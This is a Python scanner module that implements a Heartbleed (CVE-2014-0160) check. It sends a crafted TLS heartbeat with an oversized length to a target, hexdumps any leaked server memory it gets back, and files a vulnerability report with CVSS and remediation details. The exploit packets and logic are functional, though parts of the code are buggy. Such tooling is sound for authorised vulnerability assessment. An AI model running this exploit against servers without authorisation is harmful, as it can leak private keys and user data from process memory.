#!/usr/bin/python
"""
[properties]
@author: Mario Robles
@version: 1.1
@name: Heartbleed CVE-2014-0160
@id: heartbleed
@description: The TLS and DTLS implementations in OpenSSL 1.0.1 before 1.0.1g do not properly handle Heartbeat Extension packets, which allows remote attackers to obtain sensitive information from process memory via crafted packets that trigger a buffer over-read, as demonstrated by reading private keys, related to d1_both.c and t1_lib.c, aka the Heartbleed bug.
@syntax: use heartbleed; host {hostname}; port {port_number}; exploit;
@type: exploit
@impact: safe
@service: https
@return_type: vuln
[properties]
type = [function,exploit,integration,tool]
impact = [safe,intrusive,dos]
service = [ssh,ftp,smtp,pop,imap,web,http,https,smb,tcp-##,udp-##]
return_type = [vuln,asset,boolean,null]
"""

import sys
import struct
import socket
import time
import select
console = print


def h2bin(x):
    raw_x = x.replace(' ', '').replace('\n', '')
    return bytes.fromhex(raw_x)


hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

hb = h2bin(''' 
18 03 02 00 03
01 40 00
''')


def hexdump(s):
    try:
        s = s.decode('utf-8', errors="replace")
        for b in range(0, len(s), 16):
            lin = [c for c in s[b: b + 16]]
            hx_data = ' '.join('%02X' % ord(c) for c in lin)
            pdat = ''.join((c if 32 <= ord(c) <= 126 else '.') for c in lin)
            console('  %04x: %-48s %s' % (b, hx_data, pdat))
    except Exception as e:
        console(f'[ X ] Error: {e}')


def recv_all(s, length, timeout=5):
    end_time = time.time() + timeout
    rdata = b''
    remain = length
    while remain > 0:
        rtime = end_time - time.time()
        if rtime < 0:
            return None
        r, _, _ = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
        

def recv_msg(s):
    hdr = recv_all(s, 5)
    if hdr is None:
        console('[ ! ] Unexpected EOF receiving record header - server closed connection', "green")
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recv_all(s, ln, 10)
    if pay is None:
        console('[ ! ] Unexpected EOF receiving record payload - server closed connection', "green")
        return None, None, None
    
    return typ, ver, pay


def hit_hb(s):
    s.send(hb)
    while True:
        typ, _, pay = recv_msg(s)
        if typ is None:
            console('[ - ] No heartbeat response received, server likely not vulnerable', "green")
            return False

        if typ == 24:
            console('[ + ] Received heartbeat response:', "green")
            hexdump(pay)
            if len(pay) > 3:
                console('[ + ] WARNING: server returned more data than it should - server is vulnerable!', "red")
            else:
                console('[ + ] Server processed malformed heartbeat, but did not return any extra data.', "orange")
            return True

        if typ == 21:
            console('[ ! ] Received alert:', "green")
            hexdump(pay)
            console('[ - ] Server returned error, likely not vulnerable', "green")
            return False


def main():
    host = ''
    port = 443
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    console('[ ! ] Connecting...')
    sys.stdout.flush()
    s.connect((host, port))
    console('[ ! ] Sending Client Hello...')
    sys.stdout.flush()
    s.send(hello)
    console('[ ! ] Waiting for Server Hello...')
    sys.stdout.flush()
    while True:
        typ, _, pay = recv_msg(s)
        if typ is None:
            console('[ - ] Server closed connection without sending Server Hello.')
            return
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            break

    console('[ ! ] Sending heartbeat request...')
    sys.stdout.flush()
    s.send(hb)
    hit_hb(s)


# Module Integration
mod_requirements = [
    {'name': 'host', 'description': 'Host name or IP address', 'type': 'domainorip', 'required': True, 'value': None},
    {'name': 'port', 'description': 'TCP port, the default is 443', 'type': 'port', 'required': False, 'value': 443}
]


def requirements():
    return mod_requirements


def run(reqs):
    global console
    target = None
    port = None
    try:
        if isinstance(reqs, list):
            for req in reqs:
                if "console" in req.keys():
                    console = req.get('console', print)
                if req.get('name') == 'host':
                    target = req['value']
                elif req.get('name') == 'port':
                    port = int(req['value'])
        if target is None or port is None:
            return {'description': 'Errors found in the data provided', 'status': 'error'}
    except Exception as e:
        return {'description': f'Errors found in the data provided: {e}', 'status': 'error'}
    try:
        url = f"https://{target}"
        if port != 443:
            url = f"{url}:{port}"
        new_vuln = {'type': "Heartbleed",
                    'issue_type': 'vulnerability',
                    'vulnerability_type': 'web',
                    'scan_type': 'dynamic scan',
                    'severity': 'Medium',
                    'confidence': 'Moderate',
                    'evidence': None,
                    'details': 'The TLS and DTLS implementations in OpenSSL 1.0.1 before 1.0.1g do not properly '
                               'handle Heartbeat Extension packets, which allows remote attackers to obtain sensitive '
                               'information from process memory via crafted packets that trigger a buffer over-read, '
                               'as demonstrated by reading private keys, related to d1_both.c and t1_lib.c, '
                               'aka the Heartbleed bug.',
                    'url': url,
                    'port': port,
                    'tool': 'heartbleed.py',
                    'transport': 'tcp',
                    'protocol': 'https',
                    'attack': None,
                    'cve': 'CVE-2014-0160',
                    'cvss': '5',
                    'cvss string': 'AV:N/AC:L/Au:N/C:P/I:N/A:N',
                    'cwe': 'CWE-119',
                    'remediation': 'Update OpenSSL to the latest version available',
                    'references': [
                        {'title': 'CVE-2014-0160', 'url': 'https://nvd.nist.gov/vuln/detail/cve-2014-0160'}
                    ],
                    }
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        console('[ ! ] Connecting...', "green")
        sys.stdout.flush()
        s.connect((target, port))
        console('[ ! ] Sending Client Hello...', "green")
        sys.stdout.flush()
        s.send(hello)
        console('[ ! ] Waiting for Server Hello...', "green")
        sys.stdout.flush()
        while True:
            typ, _, pay = recv_msg(s)
            if typ is None:
                console('[ ! ] Server closed connection without sending Server Hello.', "green")
                return {'description': 'Not vulnerable', 'status': 'error'}
            # Look for server hello done message.
            pay = pay.decode('utf-8', errors="replace")
            if typ == 22 and ord(pay[0]) == 0x0E:
                break
    
        console('[ ! ] Sending heartbeat request...', "green")
        sys.stdout.flush()
        s.send(hb)
        is_vulnerable = hit_hb(s)
        return {'results': new_vuln, 'status': is_vulnerable}
    except Exception as e:
        console(f'[ X ] Error: {e}', "red")
        return {'description': f'Error: {e}', 'status': 'error'}
# Module Integration
